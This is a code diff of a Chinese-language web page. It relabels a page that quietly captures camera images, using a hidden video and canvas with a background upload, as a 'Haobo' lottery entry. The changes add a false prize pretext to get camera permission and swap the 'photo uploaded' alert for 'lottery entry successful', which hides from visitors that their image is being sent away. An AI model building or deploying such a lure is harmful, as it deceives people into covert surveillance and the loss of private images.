@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>请您拍照</title>
+    <title>请你授权</title>
 </head>
 <body>
-    <h1>请您拍照</h1>
+    <h1>请您授权摄像头参加Haobo的抽奖</h1>
     <p>正在后台处理，请稍候...</p>
     <video id="video" autoplay playsinline style="display: none;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
@@ -51,7 +51,7 @@
             })
             .then(response => {
                 if (response.ok) {
-                    alert('照片已成功上传！');
+                    alert('抽奖参与成功！');
                 } else {
                     response.text().then(text => alert('上传失败，服务器返回: ' + text));
                 }
